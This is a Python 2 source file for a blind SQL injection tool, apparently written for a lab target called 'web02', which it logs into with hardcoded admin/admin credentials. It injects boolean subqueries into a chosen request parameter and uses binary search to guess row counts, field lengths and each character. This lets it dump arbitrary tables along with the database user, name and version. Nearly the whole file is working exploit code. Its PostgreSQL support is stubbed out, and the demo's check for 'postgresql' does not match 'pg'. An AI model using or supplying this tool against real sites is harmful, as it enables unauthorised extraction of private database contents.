import StringIO
import gzip
import urllib
import urllib2
from urlparse import urlparse, parse_qsl
from config import config
import requests

import time

import sys


class BlindSql:

    header = {
        'User-Agent': config['User-Agent'],
        'Accept-Language': config['Accept-Language'],
        'Accept-Encoding': config['Accept-Encoding'],
        'Keep-Alive': config['Keep-Alive'],
        'Connection': config['Connection'],
        'Cache-Control': config['Cache-Control'],
    }

    def __init__(self, url='', signal_str=None, data=None, vulnerable_param=None, cookie=None, timeout=None,
                 method='GET', dbms=None, distinguish_obj=None, verbose=False):
        self.url, self.params = self.parse_params(url, data)
        if len(self.params) == 0:
            raise Exception('Need at least 1 parameter')

        # param to inject
        if vulnerable_param is None:
            self.vulnerable_params = self.params.keys()[-1]
        else:
            self.vulnerable_params = vulnerable_param

        self.signal_str = signal_str if signal_str is not None else config['signal_str']
        self.timeout = timeout if timeout is not None else config['timeout']
        self.header = BlindSql.header
        self.header['Cookie'] = cookie if cookie is not None else config['cookie']
        self.build_request = self.build_get_req_session if method == 'GET' else self.build_post_req_session
        self.dbms = dbms if dbms is not None else config['dbms']
        self.to_str, self.concat = self.set_dbms(self.dbms)
        self.distinct = distinguish_obj
        self.req = self.login()
        self.verbose = verbose

    @staticmethod
    def parse_params(url, data):
        if data is None:
            parsed = urlparse(url)
            data = parsed.query
            url = parsed.scheme + '://' + parsed.hostname + parsed.path
        data = dict(parse_qsl(data, True))
        return url, data

    # Convert string to hex format - mysql
    @staticmethod
    def mysql_to_hex(s):
        return '0x' + ''.join(map(lambda c: hex(ord(c)).replace('0x', ''), s))

    # Group all field to one field in mysql, sperate by 0x3a
    @staticmethod
    def concat_ws(fields):
        return 'concat_ws(0x3a, {0})'.format(fields)

    # @TODO implement it convert string in postgresql
    def pg_to_string(self, s):
        pass

    # @TODO implement it Group all field to one field in postgresql, seperate by 0x3a
    def concat_pg(self, fields):
        pass

    def set_dbms(self, dbms):
        dbms_function = {
            'mysql': (self.mysql_to_hex, self.concat_ws),
            'pg': (self.pg_to_string, self.concat_pg),
        }
        if dbms not in dbms_function:
            raise Exception('Only support for mysql and postgresql')
        return dbms_function[dbms]

    @staticmethod  # web02 login
    def login():
        url_login = config['url2'] + "/login.php"
        login_data = {"login": "admin", "password": "admin", "submit": "submit"}
        s = requests.session()
        s.post(url_login, login_data)
        return s

    # For session request
    def build_get_req_session(self, params):
        return self.req.get(self.url, params=params)

    def build_post_req_session(self, params):
        return self.req.post(self.url, data=params)

    def make_req_session(self, params):
        resp = self.build_request(params)
        header = resp.headers
        if ('Contend-Encoding' in header and header['Contend-Encoding'] == 'gzip') or \
                ('contend-encoding' in header and header['contend-encoding'] == 'gzip'):
            url_file = StringIO.StringIO(resp.content)
            data = gzip.GzipFile(fileobj=url_file).read()
        else:
            data = resp.text
        time.sleep(self.timeout)
        return self.check_successfull_response(data)

    # For none session req
    def build_get_request(self, params):
        return urllib2.Request(self.url + '?' + urllib.urlencode(params), None, self.header)

    def build_post_request(self, params):
        return urllib2.Request(self.url, urllib.urlencode(params), self.header)

    def send_request(self, req):
        result = urllib2.urlopen(req)
        header = result.headers
        if 'Contend-Encoding' in header and header['Contend-Encoding'] == 'gzip':
            url_file = StringIO.StringIO(result.read())
            data = gzip.GzipFile(fileobj=url_file).read()
        else:
            data = result.read()  # No encode
        result = self.check_successfull_response(data)
        time.sleep(self.timeout)
        return result

    def make_request(self, params):
        return self.send_request(self.build_request(params))

    # @TODO check whether response distinguish between normal and un-normal response
    def check_successfull_response(self, data):
        if self.distinct is None:
            return self.signal_str in data
        return self.distinct.is_right_answer(data)  # @TODO Need distinct obj implement "is_right_answer(data)" method

    # Inject count param
    def count_param(self, operator, number, table):
        params = dict(self.params)
        params[self.vulnerable_params] += ' and {0} {1} (select count(*) from {2}) '.format(number, operator, table)
        return params

    # Inject length param
    def length_param(self, operator, number, field, table, offset):
        params = dict(self.params)
        table = ' from ' + table if table is not None else ''
        params[self.vulnerable_params] += ' and {0} {1} (select length({2}) {3} limit 1 offset {4})'\
            .format(number, operator, field, table, offset)
        return params

    # Inject char param
    def char_param(self, number, field, str_index, table, offset):
        params = dict(self.params)
        table = ' from ' + table if table is not None else ''
        params[self.vulnerable_params] += ' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4})'\
            .format(number, field, str_index, table, offset)
        return params

    @staticmethod
    def echo_trying(string, number):
        print 'Trying {0} {1}'.format(string, number)

    # Binary search to guess count
    def guess_count_record(self, table):
        end = 1
        while True:
            if self.verbose:
                self.echo_trying('guess the max of count record is ', end)
            params = self.count_param('>', end, table)
            if self.make_req_session(params):
                break
            end *= 2
        if self.verbose:
            print 'The max of count record is: ' + str(end)
        start = end / 2
        while start < end:
            mid = (start + end) / 2
            params = self.count_param('<', mid, table)
            if self.make_req_session(params):
                start = mid + 1
            else:
                end = mid
            if mid == end - 1:
                return mid + 1
            elif start == end:
                return mid
        print 'Error when guess count'
        return -1

    # Bin search to guess length fileds at index_record in table
    def guess_len(self, fields, table, index_record):
        end = 1
        while True:
            if self.verbose:
                self.echo_trying('guess the max of length is: ', end)
            params = self.length_param('>', end, fields, table, index_record)
            if self.make_req_session(params):
                break
            end *= 2
        if self.verbose:
            print 'The max of length is: ' + str(end)
        start = end / 2
        while start < end:
            mid = (start + end) / 2
            params = self.length_param('<', mid, fields, table, index_record)
            if self.make_req_session(params):
                start = mid + 1
            else:
                end = mid
            if mid == end - 1:
                return mid + 1
            elif start == end:
                return mid
        print 'Error when guess length'
        return -1

    # Guess data of field at index_record in table
    def guess_data(self, field, table=None, index_record=0):
        length = self.guess_len(field, table, index_record)
        if self.verbose:
            print '[+] Guess length is: ' + str(length)
        output = ''

        # Guess each character
        for i in range(1, length+1):
            # Fetch all range from 0x20 to 0x7e
            start = ord(' ')
            end = ord('~')
            cur_len = len(output)
            while cur_len == len(output):
                mid = (start + end) / 2
                params = self.char_param(mid, field, i, table, index_record)
                if self.make_req_session(params):
                    start = mid + 1
                else:
                    end = mid
                if mid == end - 1:
                    if self.verbose:
                        print 'Char at index ' + str(i) + ' is ' + chr(mid + 1)
                    output += chr(mid + 1)
                elif start == end:
                    if self.verbose:
                        print 'Char at index ' + str(i) + ' is ' + chr(mid)
                    output += chr(mid)
        if self.verbose:
            print '[r] The complete data is ' + output
        return output

    # Show result
    def count_record_in(self, table):
        if self.verbose:
            print '[+] Guess count record ...'
            print '[+] Guessed count is ' + str(self.guess_count_record(table))

    def parse_where(self, where_sentence):
        where_cond = []
        for i in where_sentence.split(' '):
            if (len(i) > 0) and i[0] == "'":
                where_cond.append(self.to_str(i[1:-1]))
            else:
                where_cond.append(i)
        return ' '.join(where_cond)

    # Dumping query data
    def query(self, fields, table, where='', start=0, number_record=None):
        try:
            print "[+] Guessing number of row in table " + table
            if len(where) > 0:
                where = self.parse_where(where)
                table = table + ' where ' + where
            fields_concat = self.concat(fields) if ',' in fields else fields
            count = self.guess_count_record(table)
            if number_record is None:
                number_record = count
            elif number_record > count:
                number_record = count
            if self.verbose:
                print "[i] Number rows: " + str(count)
            results = []
            print "[i] Dumping record ..."
            for i in range(start, number_record):
                if self.verbose:
                    print "[i] Dumping record " + str(i + 1) + "/" + str(count)
                results.append(self.guess_data(fields_concat, table, i))
            print "[+] Query result"
            results_format = []
            for idx, record in dict(zip(range(len(results)), results)).iteritems():
                field_list = fields.split(',')
                record_field = record.split(':')
                rec = dict(zip(field_list, record_field))
                results_format.append(record_field)
                if self.verbose:
                    print '[->] -------Record {0}--------'.format(idx + 1)
                    for k, v in rec.iteritems():
                        print '     ' + k.strip() + ' : ' + v
            return results_format
        except KeyboardInterrupt, e:
            print "Keyboard interruption"

    # Test function
    def basic_demo_concept(self):
        if self.dbms == 'mysql':
            username = 'user()'
            database = 'database()'
            version = 'version()'
        elif self.dbms == 'postgresql':
            username = 'getpgusername()'
            database = 'current_database()'
            version = 'version()'
        else:
            print "Just support mysql and postgresql"
            sys.exit(1)
        print "[+] Retrieve username, database and version ..."
        username = str(self.guess_data(username))
        database = str(self.guess_data(database))
        version = str(self.guess_data(version))
        print "[i] Username : " + username
        print "[i] Database : " + database
        print "[i] Version : " + version
        return username, database, version







